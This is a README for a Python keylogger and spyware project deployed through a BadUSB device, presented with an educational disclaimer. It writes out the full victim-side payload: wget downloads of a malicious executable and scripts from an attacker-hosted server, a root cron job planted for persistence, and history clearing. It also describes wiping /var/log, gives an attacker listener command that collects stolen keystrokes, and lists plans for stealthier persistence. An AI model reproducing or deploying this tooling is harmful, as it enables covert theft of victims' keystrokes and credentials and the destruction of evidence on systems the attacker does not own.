# HID Spyware - Keylogger with Persistence & Remote Control

A Python-based spyware and keylogger project designed for educational and cybersecurity research purposes.  
This project demonstrates how a malicious actor could deploy a spyware payload using a BadUSB (Teensy/Arduino), maintain persistence on the victim's machine, and exfiltrate keystrokes remotely.

---

## 🚨 Disclaimer

**This project is strictly for educational and ethical hacking purposes.**  
Do not use it on machines or networks you do not own or have explicit permission to test.  
The author is not responsible for any misuse or illegal activities.

---

## 🖥️ Features

- **Persistence:** Uses a cron job to execute the spyware every 2 minutes.
- **Fast Deployment:** Payload automatically downloads malicious scripts and executable.
- **Cross-Platform:** Compatible with Linux & Windows (Limited efficiency on Windows).
- **Evasion:** Bypasses default Linux security, limited effectiveness on MacOS & Windows.
- **Trace Cleaning:** Deletes shell history and log files after execution.
- **Original Build:** Developed in Python with Shell scripting and BadUSB payload.

---

## 📂 Project Structure

```
Spyware/
├── spyware-server.py          # Server listening for incoming victim connections
├── keylogger.py               # Keylogger script
├── system_kernel.py           # Main spyware client
├── dist/                      # Folder containing the built executable (after PyInstaller)
├── files/                     # Directory where captured keystrokes are stored
├── payload/
│   └── payload.ino            # Arduino/Teensy payload script
├── system-edit.sh             # Shell script executed by cron to ensure persistence
├── cron-system.sh             # Cron job definition
└── README.md
```

---

## ⚙️ Prerequisites

- Python 3.x
- `pyinstaller` (For building the executable)
- A Teensy/Arduino BadUSB device
- Linux target machine (recommended)
- Basic networking knowledge

---

## 🚀 Installation & Setup

### 1. Clone the Repository

```bash
git clone https://github.com/Enstso/Spyware.git
cd Spyware
```

### 2. Generate the Executable

```bash
pyinstaller -F system_kernel.py --add-data "./keylogger.py:."
```

The executable will be generated in the `dist/` folder.

### 3. Run the web server the malicious executable and scripts are hosted :

```bash
python3 -m http.server 8000
```

---

## 🧩 How it works

### **Victim Side (Payload Execution)**

Once the Teensy/Arduino BadUSB is plugged into the victim machine, it executes the following:

```bash
cd /root/Downloads
wget http://ip_server:8000/system_kernel
chmod +x system_kernel
wget http://ip_server:8000/system-edit.sh
chmod +x system-edit.sh
cd /etc/cron.d/
wget http://ip_server:8000/cron-system.sh
chmod +x cron-system.sh
cd /root/Downloads
./system_kernel
history -c
exit
```

The payload will:

1. Download the malicious executable and scripts.
2. Add a cron job to ensure persistence (`system-edit.sh` executed every 2 minutes).
3. Clean command history to hide traces.

**Persistence Logic (`system-edit.sh`):**
- Checks if `.document1.txt` exists.
- If not, relaunches `system_kernel` and deletes `/var/log/` content.

**Cron Job (`cron-system.sh`):**
```
2 * * * * root /root/Downloads/system-edit.sh
```

---

### **Attacker Side (Server Listening)**

1. Start the spyware server:

```bash
python3 spyware-server.py -l 12345
```

**Optional:** To see all available options:

```bash
python3 spyware-server.py --help
```

2. Make sure the `files/` directory exists:

```bash
mkdir files
```

All captured keystrokes from victims will be stored here.

---

## 📜 Scenario Overview

1. **Attacker:** Starts the spyware server on port `12345`.
2. **Attacker:** Serves the spyware executable and scripts on port `8000`.
3. **Victim:** BadUSB is plugged in → payload is executed → spyware & scripts downloaded.
4. **Spyware:** 
   - Connects to attacker's server.
   - Starts keylogging and sends captured keystrokes.
   - Runs persistently via cron job every 2 minutes.
   - Deletes system logs and history to erase evidence.
5. **Attacker:** Receives and stores keystrokes in `files/` folder.

---

## ⚠️ Important Notes

- The spyware is more effective on **Linux** systems.  
- It bypasses default Linux protections but has limited effectiveness on **Windows** and **MacOS**.
- This project is intended for controlled environments and cybersecurity demonstrations only.

---

## 🧩 Future Improvements

- Implement stealthier persistence techniques.
- Add encryption for communication and stored data.
- Improve Windows and MacOS compatibility.
- Add automatic detection of victim IP and OS.
